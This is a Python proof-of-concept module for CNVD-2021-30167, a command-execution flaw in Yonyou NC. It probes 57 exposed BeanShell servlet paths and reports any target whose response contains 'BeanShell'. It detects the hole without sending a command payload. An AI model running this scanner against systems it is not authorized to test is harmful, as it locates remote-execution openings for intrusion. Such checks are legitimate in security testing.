'''
Function:
    CNVD-2021-30167 用友NC命令执行漏洞
Author:
    spmonkey,夜梓月
Email：
    spmonkey@hscsec.cn
    yeziyue@hscsec.cn
Blog:
    https://spmonkey.github.io/
    https://www.cnblogs.com/zy4024/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
from gevent import monkey;monkey.patch_all()
from gevent.pool import Pool
import requests
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.rce_list = ["service/~alm/bsh.servlet.BshServlet","service/~ampub/bsh.servlet.BshServlet","service/~arap/bsh.servlet.BshServlet","service/~aum/bsh.servlet.BshServlet","service/~cc/bsh.servlet.BshServlet","service/~cdm/bsh.servlet.BshServlet","service/~cmp/bsh.servlet.BshServlet","service/~ct/bsh.servlet.BshServlet","service/~dm/bsh.servlet.BshServlet","service/~erm/bsh.servlet.BshServlet","service/~fa/bsh.servlet.BshServlet","service/~fac/bsh.servlet.BshServlet","service/~fbm/bsh.servlet.BshServlet","service/~ff/bsh.servlet.BshServlet","service/~fip/bsh.servlet.BshServlet","service/~fipub/bsh.servlet.BshServlet","service/~fp/bsh.servlet.BshServlet","service/~fts/bsh.servlet.BshServlet","service/~fvm/bsh.servlet.BshServlet","service/~gl/bsh.servlet.BshServlet","service/~hrhi/bsh.servlet.BshServlet","service/~hrjf/bsh.servlet.BshServlet","service/~hrpd/bsh.servlet.BshServlet","service/~hrpub/bsh.servlet.BshServlet","service/~hrtrn/bsh.servlet.BshServlet","service/~hrwa/bsh.servlet.BshServlet","service/~ia/bsh.servlet.BshServlet","service/~ic/bsh.servlet.BshServlet","service/~iufo/bsh.servlet.BshServlet","service/~modules/bsh.servlet.BshServlet","service/~mpp/bsh.servlet.BshServlet","service/~obm/bsh.servlet.BshServlet","service/~pu/bsh.servlet.BshServlet","service/~qc/bsh.servlet.BshServlet","service/~sc/bsh.servlet.BshServlet","service/~scmpub/bsh.servlet.BshServlet","service/~so/bsh.servlet.BshServlet","service/~so2/bsh.servlet.BshServlet","service/~so3/bsh.servlet.BshServlet","service/~so4/bsh.servlet.BshServlet","service/~so5/bsh.servlet.BshServlet","service/~so6/bsh.servlet.BshServlet","service/~tam/bsh.servlet.BshServlet","service/~tbb/bsh.servlet.BshServlet","service/~to/bsh.servlet.BshServlet","service/~uap/bsh.servlet.BshServlet","service/~uapbd/bsh.servlet.BshServlet","service/~uapde/bsh.servlet.BshServlet","service/~uapeai/bsh.servlet.BshServlet","service/~uapother/bsh.servlet.BshServlet","service/~uapqe/bsh.servlet.BshServlet","service/~uapweb/bsh.servlet.BshServlet","service/~uapws/bsh.servlet.BshServlet","service/~vrm/bsh.servlet.BshServlet","service/~yer/bsh.servlet.BshServlet","servlet/~ic/bsh.servlet.BshServlet", "service/~aim/bsh.servlet.BshServlet"]
        self.text_list = []
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, path):
        result_text = ""
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        target_url = "{}://{}/{}".format(scheme, netloc, path)
        try:
            headers = {
                'User-Agent': get_user_agent.get_user_agent(),
            }
            result = requests.get(url=target_url, headers=headers, verify=False, proxies=self.proxies)
            if "BeanShell" in result.text:
                target = urlparse(target_url)
                result_text += """\n        [+]    \033[32m检测到目标站点存在任意命令执行漏洞\033[0m
             GET {} HTTP/1.1
             Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    result_text += "\n                 {}: {}".format(request_type, request_text)
                self.text_list.append(result_text)
        except:
            pass

    def main(self):

        pool = Pool(len(self.rce_list))
        pool.map(self.vuln, self.rce_list)
        return self.text_list

